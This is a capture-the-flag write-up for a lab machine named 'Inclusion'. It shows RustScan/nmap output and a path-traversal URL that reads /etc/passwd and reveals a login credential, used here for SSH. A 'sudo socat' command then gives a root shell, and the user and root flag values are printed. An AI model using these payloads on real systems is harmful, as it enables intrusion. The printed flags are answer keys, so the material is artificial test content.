# Inclusion

## Notes
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/gabriel/snap/rustscan/28/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.201.122:22
Open 10.10.201.122:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] 
Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-08 22:21 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:21
Completed NSE at 22:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:21
Completed NSE at 22:21, 0.00s elapsed
Initiating Ping Scan at 22:21
Scanning 10.10.201.122 [2 ports]
Completed Ping Scan at 22:21, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:21
Completed Parallel DNS resolution of 1 host. at 22:21, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 22:21
Scanning 10.10.201.122 [2 ports]
Discovered open port 22/tcp on 10.10.201.122
Discovered open port 80/tcp on 10.10.201.122
Completed Connect Scan at 22:21, 0.04s elapsed (2 total ports)
Initiating Service scan at 22:21
Scanning 2 services on 10.10.201.122
Completed Service scan at 22:22, 6.09s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.201.122.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 1.22s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
Nmap scan report for 10.10.201.122
Host is up, received syn-ack (0.034s latency).
Scanned at 2021-04-08 22:21:57 BST for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDH1X4Cqbxb5okQZBN3LvsIM8dYZOxeMWlReUkWWp+ICQ+6RjVs+bSbShCPac1Zc+lbnfHte1ZRtMW8a3OodW02+8PXcDbZlmMNMWUQmM76D2NZz28PDC7vouYqSQGt6J6gfsTq2YqCMVPU28uoJ/Qvg5C6hM3oFFDztV2BN7Pj+SgZ8a5htxv5wgn/PtWju2CJCQzPhLUrkAlrSb97/YQcvtjwXUGzKGHo62Cl6GINLm3nAVqJnNpm7aWcKowdfnEsrp+S41W5xV1gl4CyvE9usk5LfQwlPDF50FCgzsidA7mn4NbTukdTsNMAOTe0oAmjXAE0q/KCT076stYjRphX
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPvYRKovqOIYhJN1NV8r3T3YTa4N40XFZaWSQjuYyZIsuL6D8Xn9C4v925gPkS/wZyYBh7CRt6CcSbd2ekPByzo=
|   256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAd782HHJj9kHBKUMOUOgfWVBU9LdeGrlTDQ+Z0hD8yI
80/tcp open  http    syn-ack Werkzeug httpd 0.16.0 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds
```

The website had a local file inclusion vulnerability where you were able to print the contents of any file. Printing `/etc/passwd` with `http://10.10.201.122/article?name=../../../../etc/passwd` showed an interesting entry at the bottom: `#falconfeast:rootpassword`. This was able to log in via SSH.

Escalation was done through the use of socat, which was allowed to run with sudo privileges - this command `sudo socat stdin exec:/bin/bash` returned a root shell, that was tremendously unstable, but capable of retrieving the root flag.

**Questions**

    1. User flag

60989655118397345799

    2. Root flag

42964104845495153909